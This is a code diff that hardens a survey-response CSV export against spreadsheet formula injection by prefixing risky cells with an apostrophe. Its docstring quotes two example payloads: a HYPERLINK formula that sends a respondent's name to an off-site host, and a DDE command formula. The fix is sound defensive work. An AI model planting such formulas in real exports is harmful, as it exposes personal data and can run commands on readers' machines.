@@ -46,6 +46,26 @@ from .serializers import (
 )
 
 
+#: Characters that make a spreadsheet treat a cell as a FORMULA rather than as text.
+_CSV_FORMULA_LEADERS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _csv_safe(value: str) -> str:
+    """One cell, with any formula it might have been read as defused.
+
+    Survey answers are written by students and read in Excel. A reply of
+    ``=HYPERLINK("https://elsewhere/?d="&B2,"Results")`` is a live link in the downloaded
+    file that carries the neighbouring cell — the respondent's NAME — off-site when an
+    administrator clicks it. ``=cmd|'/c calc'!A1`` is the same shape pointed at DDE.
+
+    The fix is the standard one: a leading apostrophe, which Excel and LibreOffice both eat
+    while displaying the rest verbatim. Applied to prompts too, because an author writes
+    those and they land in the header row.
+    """
+    text = "" if value is None else str(value)
+    return f"'{text}" if text.startswith(_CSV_FORMULA_LEADERS) else text
+
+
 def _is_super_admin(user) -> bool:
     return bool(getattr(user, "is_superuser", False)) or (
         normalized_role(user) == acc_const.ROLE_SUPER_ADMIN
@@ -341,29 +361,52 @@ class SurveyResponsesCsvView(_AuthoringView):
         # mojibake. The BOM is what tells it otherwise.
         response.write("\ufeff")
 
+        # A column is emitted when the question is CONFIGURED to collect comments, or when
+        # any stored answer actually carries one. The second half matters: an author who
+        # clears the threshold after the replies are in would otherwise silently drop every
+        # comment already collected from the export, with nothing saying they existed.
+        answered_with_comment = {
+            a.question_id
+            for r in results["responses"]
+            for a in r.answers.all()
+            if (a.follow_up or "").strip()
+        }
+        wants_comment = {
+            q.id
+            for q in questions
+            if q.follow_up_threshold is not None
+            or q.follow_up_options
+            or q.id in answered_with_comment
+        }
+
         writer = csv.writer(response)
         header = ["Submitted at", "Student"]
         for q in questions:
-            header.append(q.prompt)
-            if q.follow_up_threshold is not None or q.follow_up_options:
-                header.append(f"{q.prompt} — comment")
+            header.append(_csv_safe(q.prompt))
+            if q.id in wants_comment:
+                header.append(_csv_safe(f"{q.prompt} — comment"))
         writer.writerow(header)
 
         for r in results["responses"]:
             by_question = {a.question_id: a for a in r.answers.all()}
             row = [
                 r.submitted_at.isoformat() if r.submitted_at else "",
-                "Anonymous" if r.is_anonymous else SurveyResponseSerializer().get_student_name(r),
+                _csv_safe(
+                    "Anonymous" if r.is_anonymous
+                    else SurveyResponseSerializer().get_student_name(r)
+                ),
             ]
             for q in questions:
                 answer = by_question.get(q.id)
                 value = answer.value if answer else None
                 row.append(
-                    "" if value is None
-                    else ", ".join(str(v) for v in value) if isinstance(value, list)
-                    else str(value)
+                    _csv_safe(
+                        "" if value is None
+                        else ", ".join(str(v) for v in value) if isinstance(value, list)
+                        else str(value)
+                    )
                 )
-                if q.follow_up_threshold is not None or q.follow_up_options:
-                    row.append(answer.follow_up if answer else "")
+                if q.id in wants_comment:
+                    row.append(_csv_safe(answer.follow_up if answer else ""))
             writer.writerow(row)
         return response
